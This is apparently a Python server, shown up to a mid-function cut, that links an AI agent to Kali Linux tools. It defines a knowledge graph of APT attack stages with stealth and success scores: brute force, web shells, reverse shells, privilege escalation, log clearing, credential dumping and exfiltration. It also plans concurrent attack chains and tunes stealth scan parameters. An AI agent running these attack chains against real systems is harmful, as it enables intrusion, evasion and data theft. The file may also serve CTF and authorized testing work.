#!/usr/bin/env python3

# This script connect the MCP AI agent to Kali Linux terminal and API Server.

# some of the code here was inspired from https://github.com/whit3rabbit0/project_astro , be sure to check them out

import argparse
import json
import logging
import os
import re
import subprocess
import sys
import traceback
import threading
import time
import uuid
import queue
from datetime import datetime, timedelta
from enum import Enum
from typing import Dict, Any, List, Optional, Set, Callable
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, Future
from collections import defaultdict
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import networkx as nx
import base64
import hashlib
import random
import urllib.parse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Configuration
API_PORT = int(os.environ.get("API_PORT", 5000))
DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
COMMAND_TIMEOUT = 180  # 5 minutes default timeout

app = Flask(__name__)
app.config['SECRET_KEY'] = 'kali_mcp_secret_key_2024'

# 初始化SocketIO，使用兼容的配置
try:
    # 尝试使用默认配置
    socketio = SocketIO(app, cors_allowed_origins="*")
except ValueError as e:
    # 如果默认配置失败，使用基本配置
    print(f"Warning: SocketIO initialization with default config failed: {e}")
    print("Falling back to basic configuration...")
    socketio = SocketIO(app)

# 全局任务管理器实例（将在main函数中初始化）

# ==================== 并发任务管理系统 ====================

class TaskStatus(Enum):
    """任务状态枚举"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"
    TIMEOUT = "timeout"
    WAITING_DEPS = "waiting_deps"

class TaskPriority(Enum):
    """任务优先级枚举"""
    LOW = 1
    NORMAL = 2
    HIGH = 3
    URGENT = 4

@dataclass
class TaskDependency:
    """任务依赖关系"""
    task_id: str
    dependency_type: str = "completion"
    condition: Optional[str] = None

@dataclass
class TaskResult:
    """任务执行结果"""
    task_id: str
    status: TaskStatus
    output: Dict[str, Any]
    error: Optional[str] = None
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    execution_time: Optional[float] = None
    partial_results: bool = False

# ==================== APT攻击知识图谱系统 ====================

class AttackPhase(Enum):
    """APT攻击阶段 - 基于MITRE ATT&CK框架"""
    RECONNAISSANCE = "reconnaissance"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_CONTROL = "command_control"
    EXFILTRATION = "exfiltration"

class AttackSurface(Enum):
    """攻击面类型"""
    WEB_APPLICATION = "web_application"
    NETWORK_SERVICE = "network_service"
    OPERATING_SYSTEM = "operating_system"
    DATABASE = "database"
    WIRELESS_NETWORK = "wireless_network"
    CLOUD_SERVICE = "cloud_service"
    MOBILE_APPLICATION = "mobile_application"

@dataclass
class AttackVector:
    """攻击向量定义"""
    id: str
    name: str
    surface: AttackSurface
    phase: AttackPhase
    tools: List[str]
    prerequisites: List[str]
    success_indicators: List[str]
    stealth_level: int  # 1-10, 10最隐蔽
    success_rate: float  # 0-1
    impact_level: int  # 1-10, 10影响最大
    mitre_technique: Optional[str] = None

@dataclass
class AttackPath:
    """攻击路径"""
    id: str
    name: str
    target: str
    vectors: List[AttackVector]
    dependencies: Dict[str, List[str]]
    estimated_time: int  # 分钟
    stealth_score: float
    success_probability: float
    concurrent_layers: List[List[str]] = field(default_factory=list)

@dataclass
class ConcurrentTask:
    """并发任务定义"""
    task_id: str
    tool_name: str
    parameters: Dict[str, Any]
    priority: TaskPriority = TaskPriority.NORMAL
    timeout: Optional[int] = None
    dependencies: List[TaskDependency] = field(default_factory=list)
    retry_count: int = 0
    max_retries: int = 2
    created_at: datetime = field(default_factory=datetime.now)
    tags: Set[str] = field(default_factory=set)
    metadata: Dict[str, Any] = field(default_factory=dict)

class APTKnowledgeGraph:
    """APT攻击知识图谱管理器"""

    def __init__(self):
        self.graph = nx.DiGraph()
        self.attack_vectors = {}
        self.tools_mapping = {}
        self._initialize_knowledge_base()

    def _initialize_knowledge_base(self):
        """初始化APT攻击知识库 - 完整的多阶段攻击链"""

        # ==================== 侦察阶段 (Reconnaissance) ====================
        recon_vectors = [
            AttackVector(
                id="passive_dns_enum",
                name="被动DNS枚举",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.RECONNAISSANCE,
                tools=["amass", "subfinder", "sublist3r"],
                prerequisites=[],
                success_indicators=["subdomains_discovered", "dns_records_found"],
                stealth_level=10,
                success_rate=0.95,
                impact_level=3,
                mitre_technique="T1590.002"
            ),
            AttackVector(
                id="osint_gathering",
                name="开源情报收集",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.RECONNAISSANCE,
                tools=["theharvester", "sherlock", "recon-ng"],
                prerequisites=[],
                success_indicators=["emails_found", "social_accounts_found", "employee_info"],
                stealth_level=10,
                success_rate=0.9,
                impact_level=4,
                mitre_technique="T1589"
            ),
            AttackVector(
                id="port_scanning",
                name="端口扫描",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.RECONNAISSANCE,
                tools=["nmap", "masscan", "zmap"],
                prerequisites=[],
                success_indicators=["open_ports_discovered", "services_identified"],
                stealth_level=7,
                success_rate=0.95,
                impact_level=3,
                mitre_technique="T1046"
            ),
            AttackVector(
                id="service_enumeration",
                name="服务枚举",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.RECONNAISSANCE,
                tools=["nmap", "nuclei"],
                prerequisites=["open_ports_discovered"],
                success_indicators=["service_versions_found", "vulnerabilities_identified"],
                stealth_level=6,
                success_rate=0.85,
                impact_level=5,
                mitre_technique="T1046"
            )
        ]

        # ==================== 初始访问阶段 (Initial Access) ====================
        initial_access_vectors = [
            AttackVector(
                id="sql_injection",
                name="SQL注入攻击",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["sqlmap", "nuclei"],
                prerequisites=["web_service_discovered"],
                success_indicators=["database_access", "data_extraction", "sql_shell_access"],
                stealth_level=6,
                success_rate=0.7,
                impact_level=9,
                mitre_technique="T1190"
            ),
            AttackVector(
                id="web_shell_upload",
                name="Web Shell上传",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["nuclei", "wfuzz"],
                prerequisites=["upload_functionality_found"],
                success_indicators=["webshell_uploaded", "code_execution"],
                stealth_level=5,
                success_rate=0.5,
                impact_level=8,
                mitre_technique="T1505.003"
            ),
            AttackVector(
                id="ssh_bruteforce",
                name="SSH暴力破解",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["hydra", "medusa", "ncrack"],
                prerequisites=["ssh_service_discovered"],
                success_indicators=["ssh_access_gained", "user_credentials"],
                stealth_level=3,
                success_rate=0.4,
                impact_level=8,
                mitre_technique="T1110.001"
            ),
            AttackVector(
                id="smb_exploit",
                name="SMB漏洞利用",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["metasploit", "nuclei"],
                prerequisites=["smb_service_discovered", "vulnerable_smb_version"],
                success_indicators=["system_access", "lateral_movement_possible"],
                stealth_level=4,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1210"
            ),
            AttackVector(
                id="rce_exploit",
                name="远程代码执行漏洞利用",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["metasploit", "nuclei"],
                prerequisites=["vulnerabilities_identified"],
                success_indicators=["remote_shell_access", "code_execution"],
                stealth_level=5,
                success_rate=0.6,
                impact_level=9,
                mitre_technique="T1190"
            )
        ]

        # ==================== 执行阶段 (Execution) ====================
        execution_vectors = [
            AttackVector(
                id="reverse_shell_deployment",
                name="反弹Shell部署",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.EXECUTION,
                tools=["metasploit", "netcat"],
                prerequisites=["code_execution"],
                success_indicators=["reverse_shell_established", "interactive_access"],
                stealth_level=4,
                success_rate=0.8,
                impact_level=8,
                mitre_technique="T1059"
            ),
            AttackVector(
                id="powershell_execution",
                name="PowerShell执行",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.EXECUTION,
                tools=["metasploit"],
                prerequisites=["system_access"],
                success_indicators=["powershell_access", "script_execution"],
                stealth_level=6,
                success_rate=0.7,
                impact_level=7,
                mitre_technique="T1059.001"
            ),
            AttackVector(
                id="command_injection",
                name="命令注入执行",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.EXECUTION,
                tools=["nuclei", "burpsuite"],
                prerequisites=["web_service_discovered"],
                success_indicators=["command_execution", "system_commands"],
                stealth_level=5,
                success_rate=0.6,
                impact_level=8,
                mitre_technique="T1059"
            )
        ]

        # ==================== 权限提升阶段 (Privilege Escalation) ====================
        privilege_escalation_vectors = [
            AttackVector(
                id="linux_privesc",
                name="Linux权限提升",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                tools=["linpeas", "linenum"],
                prerequisites=["system_access"],
                success_indicators=["root_access", "admin_privileges"],
                stealth_level=5,
                success_rate=0.6,
                impact_level=9,
                mitre_technique="T1068"
            ),
            AttackVector(
                id="windows_privesc",
                name="Windows权限提升",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                tools=["winpeas", "metasploit"],
                prerequisites=["system_access"],
                success_indicators=["admin_access", "system_privileges"],
                stealth_level=5,
                success_rate=0.6,
                impact_level=9,
                mitre_technique="T1068"
            ),
            AttackVector(
                id="kernel_exploit",
                name="内核漏洞利用",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                tools=["metasploit"],
                prerequisites=["system_access", "kernel_version_identified"],
                success_indicators=["root_access", "kernel_level_access"],
                stealth_level=3,
                success_rate=0.4,
                impact_level=10,
                mitre_technique="T1068"
            ),
            AttackVector(
                id="sudo_abuse",
                name="Sudo权限滥用",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                tools=["gtfobins"],
                prerequisites=["user_access", "sudo_permissions"],
                success_indicators=["root_access"],
                stealth_level=7,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1548.003"
            )
        ]

        # ==================== 防御规避阶段 (Defense Evasion) ====================
        defense_evasion_vectors = [
            AttackVector(
                id="av_evasion",
                name="杀毒软件规避",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DEFENSE_EVASION,
                tools=["veil", "shellter"],
                prerequisites=["system_access"],
                success_indicators=["av_bypassed", "payload_executed"],
                stealth_level=8,
                success_rate=0.7,
                impact_level=6,
                mitre_technique="T1027"
            ),
            AttackVector(
                id="log_clearing",
                name="日志清理",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DEFENSE_EVASION,
                tools=["metasploit"],
                prerequisites=["admin_access"],
                success_indicators=["logs_cleared", "traces_removed"],
                stealth_level=9,
                success_rate=0.9,
                impact_level=5,
                mitre_technique="T1070"
            ),
            AttackVector(
                id="process_hiding",
                name="进程隐藏",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DEFENSE_EVASION,
                tools=["metasploit"],
                prerequisites=["system_access"],
                success_indicators=["process_hidden", "stealth_maintained"],
                stealth_level=8,
                success_rate=0.6,
                impact_level=6,
                mitre_technique="T1055"
            )
        ]

        # ==================== 凭据访问阶段 (Credential Access) ====================
        credential_access_vectors = [
            AttackVector(
                id="password_dumping",
                name="密码转储",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.CREDENTIAL_ACCESS,
                tools=["mimikatz", "hashcat"],
                prerequisites=["admin_access"],
                success_indicators=["passwords_dumped", "hashes_extracted"],
                stealth_level=4,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1003"
            ),
            AttackVector(
                id="keylogging",
                name="键盘记录",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.CREDENTIAL_ACCESS,
                tools=["metasploit"],
                prerequisites=["system_access"],
                success_indicators=["keystrokes_captured", "credentials_obtained"],
                stealth_level=6,
                success_rate=0.7,
                impact_level=8,
                mitre_technique="T1056.001"
            ),
            AttackVector(
                id="browser_credential_theft",
                name="浏览器凭据窃取",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.CREDENTIAL_ACCESS,
                tools=["metasploit"],
                prerequisites=["user_access"],
                success_indicators=["browser_passwords", "saved_credentials"],
                stealth_level=7,
                success_rate=0.8,
                impact_level=7,
                mitre_technique="T1555.003"
            )
        ]

        # ==================== 发现阶段 (Discovery) ====================
        discovery_vectors = [
            AttackVector(
                id="network_discovery",
                name="网络发现",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.DISCOVERY,
                tools=["nmap", "arp-scan"],
                prerequisites=["system_access"],
                success_indicators=["network_mapped", "hosts_discovered"],
                stealth_level=6,
                success_rate=0.9,
                impact_level=5,
                mitre_technique="T1018"
            ),
            AttackVector(
                id="system_info_gathering",
                name="系统信息收集",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DISCOVERY,
                tools=["systeminfo", "uname"],
                prerequisites=["system_access"],
                success_indicators=["system_info_collected", "os_version_identified"],
                stealth_level=8,
                success_rate=0.95,
                impact_level=4,
                mitre_technique="T1082"
            ),
            AttackVector(
                id="user_enumeration",
                name="用户枚举",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DISCOVERY,
                tools=["enum4linux", "rpcclient"],
                prerequisites=["system_access"],
                success_indicators=["users_enumerated", "admin_accounts_found"],
                stealth_level=7,
                success_rate=0.8,
                impact_level=6,
                mitre_technique="T1087"
            ),
            AttackVector(
                id="file_system_discovery",
                name="文件系统发现",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.DISCOVERY,
                tools=["find", "dir"],
                prerequisites=["system_access"],
                success_indicators=["sensitive_files_found", "config_files_discovered"],
                stealth_level=8,
                success_rate=0.9,
                impact_level=6,
                mitre_technique="T1083"
            )
        ]

        # ==================== 横向移动阶段 (Lateral Movement) ====================
        lateral_movement_vectors = [
            AttackVector(
                id="pass_the_hash",
                name="哈希传递攻击",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.LATERAL_MOVEMENT,
                tools=["metasploit", "impacket"],
                prerequisites=["password_hashes", "network_access"],
                success_indicators=["lateral_access", "additional_systems_compromised"],
                stealth_level=6,
                success_rate=0.7,
                impact_level=8,
                mitre_technique="T1550.002"
            ),
            AttackVector(
                id="rdp_hijacking",
                name="RDP会话劫持",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.LATERAL_MOVEMENT,
                tools=["metasploit"],
                prerequisites=["admin_access", "rdp_service_available"],
                success_indicators=["rdp_session_hijacked", "user_session_access"],
                stealth_level=5,
                success_rate=0.6,
                impact_level=8,
                mitre_technique="T1563.002"
            ),
            AttackVector(
                id="wmi_execution",
                name="WMI远程执行",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.LATERAL_MOVEMENT,
                tools=["metasploit", "impacket"],
                prerequisites=["admin_credentials", "wmi_access"],
                success_indicators=["remote_execution", "lateral_movement"],
                stealth_level=7,
                success_rate=0.8,
                impact_level=8,
                mitre_technique="T1047"
            )
        ]

        # 网络服务攻击向量
        network_vectors = [
            AttackVector(
                id="ssh_bruteforce",
                name="SSH暴力破解",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["hydra", "medusa", "ncrack"],
                prerequisites=["ssh_service_discovered"],
                success_indicators=["ssh_access_gained"],
                stealth_level=3,
                success_rate=0.4,
                impact_level=8,
                mitre_technique="T1110.001"
            ),
            AttackVector(
                id="smb_exploit",
                name="SMB漏洞利用",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.INITIAL_ACCESS,
                tools=["metasploit", "nuclei"],
                prerequisites=["smb_service_discovered", "vulnerable_smb_version"],
                success_indicators=["system_access", "lateral_movement_possible"],
                stealth_level=4,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1210"
            ),
            AttackVector(
                id="port_scanning",
                name="端口扫描",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.RECONNAISSANCE,
                tools=["nmap", "masscan", "zmap"],
                prerequisites=[],
                success_indicators=["open_ports_discovered", "services_identified"],
                stealth_level=7,
                success_rate=0.95,
                impact_level=3,
                mitre_technique="T1046"
            )
        ]

        # ==================== 收集阶段 (Collection) ====================
        collection_vectors = [
            AttackVector(
                id="data_staging",
                name="数据暂存",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.COLLECTION,
                tools=["tar", "zip"],
                prerequisites=["sensitive_files_found"],
                success_indicators=["data_staged", "files_compressed"],
                stealth_level=8,
                success_rate=0.9,
                impact_level=7,
                mitre_technique="T1074"
            ),
            AttackVector(
                id="screen_capture",
                name="屏幕截图",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.COLLECTION,
                tools=["metasploit"],
                prerequisites=["user_session_access"],
                success_indicators=["screenshots_captured", "visual_data_collected"],
                stealth_level=6,
                success_rate=0.8,
                impact_level=6,
                mitre_technique="T1113"
            ),
            AttackVector(
                id="clipboard_data",
                name="剪贴板数据收集",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.COLLECTION,
                tools=["metasploit"],
                prerequisites=["user_session_access"],
                success_indicators=["clipboard_data_collected"],
                stealth_level=7,
                success_rate=0.7,
                impact_level=5,
                mitre_technique="T1115"
            )
        ]

        # ==================== 持久化阶段 (Persistence) ====================
        persistence_vectors = [
            AttackVector(
                id="registry_persistence",
                name="注册表持久化",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PERSISTENCE,
                tools=["metasploit"],
                prerequisites=["admin_access"],
                success_indicators=["registry_key_created", "persistence_established"],
                stealth_level=6,
                success_rate=0.8,
                impact_level=8,
                mitre_technique="T1547.001"
            ),
            AttackVector(
                id="scheduled_task",
                name="计划任务持久化",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PERSISTENCE,
                tools=["metasploit"],
                prerequisites=["admin_access"],
                success_indicators=["scheduled_task_created", "periodic_execution"],
                stealth_level=7,
                success_rate=0.9,
                impact_level=8,
                mitre_technique="T1053.005"
            ),
            AttackVector(
                id="service_persistence",
                name="服务持久化",
                surface=AttackSurface.OPERATING_SYSTEM,
                phase=AttackPhase.PERSISTENCE,
                tools=["metasploit"],
                prerequisites=["admin_access"],
                success_indicators=["service_created", "boot_persistence"],
                stealth_level=5,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1543.003"
            ),
            AttackVector(
                id="web_shell_persistence",
                name="Web Shell持久化",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.PERSISTENCE,
                tools=["metasploit"],
                prerequisites=["webshell_uploaded"],
                success_indicators=["persistent_webshell", "backdoor_access"],
                stealth_level=6,
                success_rate=0.7,
                impact_level=8,
                mitre_technique="T1505.003"
            )
        ]

        # ==================== 数据渗出阶段 (Exfiltration) ====================
        exfiltration_vectors = [
            AttackVector(
                id="dns_exfiltration",
                name="DNS数据渗出",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.EXFILTRATION,
                tools=["dnscat2"],
                prerequisites=["data_staged", "dns_access"],
                success_indicators=["data_exfiltrated", "covert_channel_established"],
                stealth_level=9,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1048.003"
            ),
            AttackVector(
                id="http_exfiltration",
                name="HTTP数据渗出",
                surface=AttackSurface.WEB_APPLICATION,
                phase=AttackPhase.EXFILTRATION,
                tools=["curl", "wget"],
                prerequisites=["data_staged", "web_access"],
                success_indicators=["data_uploaded", "external_transfer"],
                stealth_level=7,
                success_rate=0.9,
                impact_level=9,
                mitre_technique="T1041"
            ),
            AttackVector(
                id="ftp_exfiltration",
                name="FTP数据渗出",
                surface=AttackSurface.NETWORK_SERVICE,
                phase=AttackPhase.EXFILTRATION,
                tools=["ftp"],
                prerequisites=["data_staged", "ftp_access"],
                success_indicators=["data_transferred", "external_storage"],
                stealth_level=5,
                success_rate=0.8,
                impact_level=9,
                mitre_technique="T1048.003"
            )
        ]

        # 添加攻击向量到知识图谱
        all_vectors = (recon_vectors + initial_access_vectors + execution_vectors +
                      privilege_escalation_vectors + defense_evasion_vectors +
                      credential_access_vectors + discovery_vectors + lateral_movement_vectors +
                      collection_vectors + persistence_vectors + exfiltration_vectors +
                      network_vectors)
        for vector in all_vectors:
            self.attack_vectors[vector.id] = vector
            self.graph.add_node(vector.id, **vector.__dict__)

            # 添加工具关系
            for tool in vector.tools:
                self.graph.add_edge(tool, vector.id, relation="can_execute")

    def identify_attack_surfaces(self, target_info: Dict[str, Any]) -> List[AttackSurface]:
        """基于目标信息识别攻击面"""
        surfaces = []

        if "ports" in target_info:
            for port_info in target_info["ports"]:
                port = port_info.get("port")
                service = port_info.get("service", "").lower()

                if port in [80, 443, 8080, 8443] or "http" in service:
                    surfaces.append(AttackSurface.WEB_APPLICATION)
                elif port == 22 or "ssh" in service:
                    surfaces.append(AttackSurface.NETWORK_SERVICE)
                elif port in [445, 139] or "smb" in service:
                    surfaces.append(AttackSurface.NETWORK_SERVICE)
                elif port in [3306, 5432, 1433]:
                    surfaces.append(AttackSurface.DATABASE)

        return list(set(surfaces))

    def generate_attack_paths(self, target: str, surfaces: List[AttackSurface]) -> List[AttackPath]:
        """生成针对特定目标的攻击路径"""
        paths = []

        for surface in surfaces:
            surface_vectors = [v for v in self.attack_vectors.values()
                             if v.surface == surface]

            if surface_vectors:
                # 按攻击阶段排序
                phase_order = list(AttackPhase)
                surface_vectors.sort(key=lambda x: phase_order.index(x.phase))

                # 计算依赖关系
                dependencies = self._calculate_dependencies(surface_vectors)

                # 生成并发执行层
                concurrent_layers = self._optimize_attack_sequence(surface_vectors, dependencies)

                path = AttackPath(
                    id=f"apt_path_{surface.value}_{len(paths)}",
                    name=f"APT {surface.value.replace('_', ' ').title()} Attack Chain",
                    target=target,
                    vectors=surface_vectors,
                    dependencies=dependencies,
                    estimated_time=sum(30 for _ in surface_vectors),
                    stealth_score=sum(v.stealth_level for v in surface_vectors) / len(surface_vectors),
                    success_probability=min(v.success_rate for v in surface_vectors),
                    concurrent_layers=concurrent_layers
                )
                paths.append(path)

        return paths

    def _calculate_dependencies(self, vectors: List[AttackVector]) -> Dict[str, List[str]]:
        """计算攻击向量之间的依赖关系"""
        dependencies = {}

        for vector in vectors:
            deps = []
            for prereq in vector.prerequisites:
                for other_vector in vectors:
                    if any(indicator in prereq for indicator in other_vector.success_indicators):
                        deps.append(other_vector.id)
            dependencies[vector.id] = deps

        return dependencies

    def _optimize_attack_sequence(self, vectors: List[AttackVector],
                                dependencies: Dict[str, List[str]]) -> List[List[str]]:
        """优化攻击序列，返回可并发执行的攻击层"""
        # 创建依赖图
        dep_graph = nx.DiGraph()
        for vector in vectors:
            dep_graph.add_node(vector.id)

        for vector_id, deps in dependencies.items():
            for dep in deps:
                dep_graph.add_edge(dep, vector_id)

        # 拓扑排序生成执行层
        layers = []
        remaining = set(v.id for v in vectors)

        while remaining:
            # 找到没有未满足依赖的节点
            ready = []
            for node in remaining:
                predecessors = set(dep_graph.predecessors(node))
                satisfied_deps = set().union(*layers) if layers else set()
                if predecessors.issubset(satisfied_deps):
                    ready.append(node)

            if not ready:
                # 如果没有ready的节点，选择依赖最少的
                ready = [min(remaining, key=lambda x: len(list(dep_graph.predecessors(x))))]

            layers.append(ready)
            remaining -= set(ready)

        return layers


# ==================== 自适应攻击系统 ====================

@dataclass
class AttackState:
    """攻击状态跟踪"""
    target: str
    completed_vectors: List[str] = field(default_factory=list)
    failed_vectors: List[str] = field(default_factory=list)
    discovered_info: Dict[str, Any] = field(default_factory=dict)
    gained_access: List[str] = field(default_factory=list)
    available_credentials: List[Dict[str, str]] = field(default_factory=list)
    current_capabilities: List[str] = field(default_factory=list)
    target_status: Dict[str, Any] = field(default_factory=dict)
    attack_phase: str = "reconnaissance"
    last_updated: datetime = field(default_factory=datetime.now)

@dataclass
class AttackResult:
    """攻击结果"""
    vector_id: str
    success: bool
    output: str
    discovered_info: Dict[str, Any] = field(default_factory=dict)
    gained_capabilities: List[str] = field(default_factory=list)
    error_message: str = ""

# ==================== CTF专用数据类 ====================

@dataclass
class CTFFlag:
    """CTF Flag数据类"""
    content: str
    format_type: str  # CTF{}, flag{}, hash, uuid等
    source: str  # 发现来源（工具名称）
    confidence: float  # 置信度 0-1
    discovered_at: datetime = field(default_factory=datetime.now)
    submitted: bool = False
    points: int = 0
    challenge_name: str = ""

@dataclass
class CTFChallenge:
    """CTF题目数据类"""
    name: str
    category: str  # web, pwn, crypto, misc, reverse
    port: int
    service: str
    difficulty: str = "unknown"  # easy, medium, hard
    status: str = "not_started"  # not_started, in_progress, solved
    flags: List[CTFFlag] = field(default_factory=list)
    attack_vectors: List[str] = field(default_factory=list)
    start_time: Optional[datetime] = None
    solve_time: Optional[datetime] = None
    notes: str = ""

@dataclass
class CTFSession:
    """CTF竞赛会话"""
    session_id: str
    name: str
    start_time: datetime
    end_time: Optional[datetime] = None
    challenges: Dict[str, CTFChallenge] = field(default_factory=dict)
    total_flags: int = 0
    total_points: int = 0
    current_rank: int = 0
    team_name: str = ""

# ==================== 智能分析增强模块 ====================

@dataclass
class ScanStep:
    """扫描步骤定义"""
    tool: str
    parameters: Dict[str, Any]
    priority: int = 5
    time_estimate: int = 60  # 秒
    success_indicators: List[str] = field(default_factory=list)

@dataclass
class CorrelatedFinding:
    """关联发现结果"""
    name: str
    confidence: float
    evidence: List[str]
    attack_chain: List[str] = field(default_factory=list)
    risk_score: int = 1

class IntelligentParameterOptimizer:
    """智能参数优化器 - 根据目标特征优化工具参数"""

    def __init__(self):
        self.optimal_params = self._load_optimal_parameters()
        self.performance_data = self._load_performance_data()
        self.target_patterns = self._load_target_patterns()

    def _load_optimal_parameters(self) -> Dict[str, Dict]:
        """加载最优参数配置"""
        return {
            'nmap': {
                'quick_scan': {
                    'sS': True, 'T4': True, 'top-ports': '1000',
                    'estimated_time': 30, 'accuracy': 0.85
                },
                'web_target': {
                    'sS': True, 'sV': True, 'scripts': 'http-*,ssl-*',
                    'ports': '80,443,8080,8443', 'estimated_time': 120, 'accuracy': 0.95
                },
                'comprehensive': {
                    'sS': True, 'sV': True, 'sC': True, 'O': True,
                    'estimated_time': 300, 'accuracy': 0.98
                },
                'stealth': {
                    'sS': True, 'T2': True, 'f': True,
                    'estimated_time': 180, 'accuracy': 0.90
                }
            },
            'gobuster': {
                'quick': {
                    'threads': 100, 'wordlist': '/usr/share/wordlists/dirb/common.txt',
                    'timeout': '10s', 'estimated_time': 60, 'accuracy': 0.75
                },
                'thorough': {
                    'threads': 50, 'wordlist': '/usr/share/wordlists/dirb/big.txt',
                    'timeout': '15s', 'estimated_time': 180, 'accuracy': 0.90
                },
                'api_focused': {
                    'threads': 80, 'extensions': 'php,json,xml,js,asp,aspx',
                    'wordlist': '/usr/share/wordlists/dirb/common.txt',
                    'estimated_time': 90, 'accuracy': 0.85
                },
                'admin_hunt': {
                    'threads': 60, 'wordlist': '/usr/share/wordlists/dirb/common.txt',
                    'url-suffix': 'admin,login,panel,dashboard',
                    'estimated_time': 45, 'accuracy': 0.80
                }
            },
            'sqlmap': {
                'quick': {
                    'level': 1, 'risk': 1, 'threads': 3,
                    'estimated_time': 120, 'accuracy': 0.70
                },
                'thorough': {
                    'level': 5, 'risk': 3, 'threads': 5, 'tamper': 'space2comment',
                    'estimated_time': 600, 'accuracy': 0.95
                },
                'stealth': {
                    'level': 2, 'risk': 1, 'delay': 2,
                    'estimated_time': 300, 'accuracy': 0.75
                }
            },
            'nikto': {
                'quick': {
                    'tuning': 'x6', 'timeout': 10,
                    'estimated_time': 90, 'accuracy': 0.80
                },
                'comprehensive': {
                    'tuning': '123456789ab', 'timeout': 20,
                    'estimated_time': 300, 'accuracy': 0.95
                }
            },
            'hydra': {
                'quick': {
                    'threads': 4, 'timeout': 30,
                    'estimated_time': 180, 'accuracy': 0.60
                },
                'thorough': {
                    'threads': 16, 'timeout': 60,
                    'estimated_time': 600, 'accuracy': 0.85
                }
            }
        }

    def _load_performance_data(self) -> Dict:
        """加载性能数据"""
        return {
            'success_rates': {
                'nmap_web_target': 0.95,
                'gobuster_admin_hunt': 0.70,
                'sqlmap_thorough': 0.80
            },
            'time_multipliers': {
                'high_latency_target': 1.5,
                'rate_limited_target': 2.0,
                'waf_protected': 1.8
            }
        }

    def _load_target_patterns(self) -> Dict:
        """加载目标模式识别"""
        return {
            'web_application': {
                'indicators': ['http', 'https', '80', '443', '8080', '8443'],
                'scan_focus': ['directory_enum', 'vulnerability_scan', 'sql_injection']
            },
            'ssh_server': {
                'indicators': ['ssh', '22'],
                'scan_focus': ['credential_attack', 'version_check']
            },
            'database_server': {
                'indicators': ['mysql', 'postgresql', 'mssql', '3306', '5432', '1433'],
                'scan_focus': ['credential_attack', 'version_check']
            },
            'windows_target': {
                'indicators': ['smb', 'netbios', '139', '445'],
                'scan_focus': ['smb_enum', 'credential_attack']
            }
        }

    def analyze_target_type(self, initial_scan: Dict) -> str:
        """分析目标类型"""
        services = initial_scan.get('services', [])
